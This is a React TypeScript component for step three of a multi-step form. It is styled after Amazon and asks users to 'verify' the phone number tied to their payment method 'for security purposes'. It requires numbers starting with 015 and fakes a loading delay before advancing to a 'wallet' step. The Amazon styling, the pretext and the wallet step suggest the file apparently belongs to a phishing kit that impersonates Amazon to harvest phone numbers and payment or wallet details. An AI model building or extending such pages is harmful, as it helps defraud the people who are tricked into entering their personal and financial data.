import { useState, useRef, useEffect } from 'react';
import { useAuth } from '../store/authStore';
import gsap from 'gsap';

export default function Step3Phone() {
  const { goToStep, updateData, goBack, setError, error } = useAuth();
  const [phone, setPhone] = useState('');
  const [localError, setLocalError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const stepRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (stepRef.current) {
      gsap.fromTo(
        stepRef.current,
        { opacity: 0, x: 30 },
        { opacity: 1, x: 0, duration: 0.3, ease: 'power2.out' }
      );
    }
    setTimeout(() => inputRef.current?.focus(), 100);
  }, []);

  const formatPhone = (value: string): string => {
    let digits = value.replace(/\D/g, '');
    // Must start with 015
    if (digits.length > 0 && !digits.startsWith('015')) {
      digits = '015' + digits.replace(/^015/, '');
    }
    if (digits.length > 11) digits = digits.slice(0, 11);

    let formatted = digits;
    if (digits.length >= 4) formatted = digits.slice(0, 3) + ' ' + digits.slice(3);
    if (digits.length >= 8) formatted = formatted.slice(0, 7) + ' ' + formatted.slice(7);

    return formatted;
  };

  const validate = (value: string): boolean => {
    const digits = value.replace(/\D/g, '');
    if (digits.length === 0) {
      setLocalError('Enter your phone number');
      return false;
    }
    if (!digits.startsWith('015')) {
      setLocalError('Phone must start with 015');
      return false;
    }
    if (digits.length !== 11) {
      setLocalError('Phone must be exactly 11 digits');
      return false;
    }
    return true;
  };

  const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value);
    setPhone(formatted);
    setLocalError('');
    setError(null);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLocalError('');
    setError(null);

    if (!validate(phone)) return;

    setIsLoading(true);
    await new Promise((resolve) => setTimeout(resolve, 400));

    updateData({ phoneNumber: phone.replace(/\D/g, '') });
    setIsLoading(false);

    if (stepRef.current) {
      gsap.to(stepRef.current, {
        opacity: 0,
        x: -30,
        duration: 0.25,
        ease: 'power2.in',
        onComplete: () => goToStep('step4-wallet'),
      });
    }
  };

  const handleBack = () => {
    if (stepRef.current) {
      gsap.to(stepRef.current, {
        opacity: 0,
        x: 30,
        duration: 0.25,
        ease: 'power2.in',
        onComplete: () => goBack(),
      });
    }
  };

  return (
    <div ref={stepRef}>
      <button className="back-btn" onClick={handleBack} type="button" aria-label="Go back">
        &#8249;
      </button>

      <h1 className="step-heading" style={{ paddingTop: 8 }}>
        Verify your payment method phone number
      </h1>
      <p className="step-subtext">
        We need to verify the phone number associated with your payment method for security purposes.
      </p>
      <form onSubmit={handleSubmit} noValidate>
        <div className="mb-3">
          <label className="amazon-label" htmlFor="phone">
            Phone Number
          </label>
          <input
            ref={inputRef}
            id="phone"
            type="tel"
            inputMode="numeric"
            className={`amazon-input ${localError || error ? 'error' : ''}`}
            placeholder="015 5040 4018"
            value={phone}
            onChange={handleInput}
            autoComplete="tel"
          />
          {(localError || error) && (
            <p className="error-text">{localError || error}</p>
          )}
        </div>
        <button type="submit" className="btn-amazon" disabled={isLoading}>
          {isLoading ? <div className="spinner" style={{ width: 16, height: 16, borderWidth: 2 }} /> : 'Continue'}
        </button>
      </form>
    </div>
  );
}
